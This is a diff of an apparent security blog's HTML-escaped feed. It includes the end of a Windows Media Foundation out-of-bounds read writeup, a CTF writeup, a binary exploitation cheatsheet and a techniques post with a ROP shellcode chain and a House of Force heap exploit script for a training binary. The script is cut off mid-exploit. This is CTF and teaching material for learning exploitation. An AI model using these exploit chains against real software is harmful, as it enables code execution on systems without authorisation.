+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remaining_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Irrelevant Code&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// OOB Read&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;This vulnerability could result in code execution when chained with other vulnerabilities.&lt;/p&gt;</content><author><name>MiloTruck</name></author><category term="Blog" /><summary type="html">Windows Media Foundation Out-of-Bounds Read Vulnerability (mfsrcsnk.dll)</summary></entry><entry><title type="html">DSO-NUS CTF 2021</title><link href="http://localhost:4000/ctf/DSO-NUS-CTF-2021/" rel="alternate" type="text/html" title="DSO-NUS CTF 2021" /><published>2021-03-01T00:00:00+08:00</published><updated>2021-03-01T00:00:00+08:00</updated><id>http://localhost:4000/ctf/DSO%20NUS%20CTF%202021</id><content type="html" xml:base="http://localhost:4000/ctf/DSO-NUS-CTF-2021/">&lt;p&gt;A local Singaporean CTF hosted by DSO National Laboratories and the National University of Singapore (NUS). I played this CTF with my regular teammate, &lt;a href=&quot;https://blog.puddle.sg/&quot;&gt;@OceanKoh&lt;/a&gt;, under the name &lt;strong&gt;It’z Me&lt;/strong&gt;. We managed to get 6th place, which I’m quite satisified with. Not bad for the first official CTF of 2021.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/DSO NUS CTF - Scoreboard.JPG&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;
 
@@ -622,9 +784,301 @@ From reversing the binary, we know that we can:&lt;/p&gt;
     &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
     &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>MiloTruck</name></author><category term="CTF" /><summary type="html">A local Singaporean CTF hosted by DSO National Laboratories and the National University of Singapore (NUS). I played this CTF with my regular teammate, @OceanKoh, under the name It’z Me. We managed to get 6th place, which I’m quite satisified with. Not bad for the first official CTF of 2021.</summary></entry><entry><title type="html">Unsafe Unlink</title><link href="http://localhost:4000/Unsafe-Unlink/" rel="alternate" type="text/html" title="Unsafe Unlink" /><published>2020-12-19T00:00:00+08:00</published><updated>2020-12-19T00:00:00+08:00</updated><id>http://localhost:4000/Unsafe%20Unlink</id><content type="html" xml:base="http://localhost:4000/Unsafe-Unlink/">&lt;p&gt;Exploiting free on a corrupted chunk to get arbitrary write. Unsafe unlinking process will result in a reflected arbitrary 8-byte write anywhere.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>MiloTruck</name></author><category term="CTF" /><summary type="html">A local Singaporean CTF hosted by DSO National Laboratories and the National University of Singapore (NUS). I played this CTF with my regular teammate, @OceanKoh, under the name It’z Me. We managed to get 6th place, which I’m quite satisified with. Not bad for the first official CTF of 2021.</summary></entry><entry><title type="html">Binary Exploitation Cheatsheet</title><link href="http://localhost:4000/blog/Binary-Exploitation-Cheatsheet/" rel="alternate" type="text/html" title="Binary Exploitation Cheatsheet" /><published>2020-12-17T00:00:00+08:00</published><updated>2020-12-17T00:00:00+08:00</updated><id>http://localhost:4000/blog/Binary%20Exploitation%20Cheatsheet</id><content type="html" xml:base="http://localhost:4000/blog/Binary-Exploitation-Cheatsheet/">&lt;h1 id=&quot;cheatsheet&quot;&gt;Cheatsheet&lt;/h1&gt;
+&lt;h2 id=&quot;calling-convention&quot;&gt;Calling Convention&lt;/h2&gt;
 
-&lt;h2 id=&quot;requirements&quot;&gt;Requirements&lt;/h2&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Arch&lt;/th&gt;
+      &lt;th&gt;Registers&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Linux (x64)&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi, rsi, rdx, rcx, r8, r9&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Windows (x64)&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rcx, rdx, r8, r9&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;pwntools&quot;&gt;pwntools&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Item&lt;/th&gt;
+      &lt;th&gt;Code&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Shellcode&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode = asm(shellcraft.sh())&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Strings&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;binsh = libc.search('/bin/sh\x00;).next()&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Gadgets&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gadget = exe.search(asm('pop rdi; ret')).next()&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Address of Section&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data = exe.get_section_by_name('.data').header.sh_addr&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;ret2syscall&quot;&gt;ret2syscall&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve(/bin/sh)&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;64-bit: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax = 59, rdi = /bin/sh, rsi = 0, rdx = 0&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;32-bit: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eax = 11, ebx = /bin/sh, ecx = 0, edx = 0&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md&quot;&gt;Syscall Table&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>MiloTruck</name></author><category term="Blog" /><summary type="html">Some notes for pwn challenges in CTFs.</summary></entry><entry><title type="html">Binary Exploitation Techniques</title><link href="http://localhost:4000/blog/Binary-Exploitation-Techniques/" rel="alternate" type="text/html" title="Binary Exploitation Techniques" /><published>2020-12-17T00:00:00+08:00</published><updated>2020-12-17T00:00:00+08:00</updated><id>http://localhost:4000/blog/Binary%20Exploitation%20Techniques</id><content type="html" xml:base="http://localhost:4000/blog/Binary-Exploitation-Techniques/">&lt;h1 id=&quot;rop&quot;&gt;ROP&lt;/h1&gt;
+
+&lt;h2 id=&quot;ret2stack-making-the-stack-executable&quot;&gt;ret2stack: Making the stack executable&lt;/h2&gt;
+&lt;ol&gt;
+  &lt;li&gt;Set value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__stack_prot&lt;/code&gt; to 7&lt;/li&gt;
+  &lt;li&gt;Call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dl_make_stack_executable(__libc_stack_end, __stack_prot)&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Jump to shellcode&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;Example&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcraft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;_dl_make_stack_executable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'_dl_make_stack_executable'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;__stack_prot&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__stack_prot'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;__libc_stack_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__libc_stack_end'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;120&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0000000000410ca3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop rsi ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__stack_prot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00000000004163f4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop rax ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x000000000047ff91&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# mov qword ptr [rsi], rax ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0000000000400696&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop rdi ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__libc_stack_end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_dl_make_stack_executable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0000000000451974&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# push rsp ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ret2csu-lack-of-gadgets-in-x64&quot;&gt;ret2csu: Lack of gadgets in x64&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html?m=1&quot;&gt;Link&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;heap&quot;&gt;Heap&lt;/h1&gt;
+
+&lt;h2 id=&quot;house-of-force-exploiting-top-chunk-header-to-gain-nearly-arbitrary-write-primitive&quot;&gt;House of Force: Exploiting Top Chunk header to gain nearly-arbitrary write primitive&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Requirements&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Control of top chunk size, usually through heap overflow&lt;/li&gt;
+  &lt;li&gt;Full control of size of allocated chunks&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Arbitrary Write Primitive&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Overwrite size of top chunk to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xffffffffffffffff&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Allocate chunk with size of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;offset&lt;/code&gt;, using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malloc()&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;If &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target &amp;lt; top_chunk&lt;/code&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;offset = top_chunk - target + allocated_chunks_size&lt;/code&gt;, and offset is negative&lt;/li&gt;
+      &lt;li&gt;If &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target &amp;gt; top_chunk&lt;/code&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;offset = target - top_chunk - allocated_chunks_size&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Allocate new chunk, this chunk will be created at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Gaining RCE using ret2libc&lt;/strong&gt;&lt;br /&gt;
+&lt;em&gt;This requires libc version to be known&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__malloc_hook&lt;/code&gt; using write primitive with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system()&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malloc(/bin/sh)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt; HeapLAB &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;House of Force&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;elf&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;./house_of_force&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;libc&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;./libc-2.28.so&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;ld&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;./ld.so.2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'size:'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'data:'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# Get addresses
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'puts() @ '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'heap @ '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;heap_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    
+    &lt;span class=&quot;c1&quot;&gt;# Calculate libc_base, etc...
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'puts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;malloc_hook&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__malloc_hook'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'system'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'heap_addr: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'malloc_hook: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc_hook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
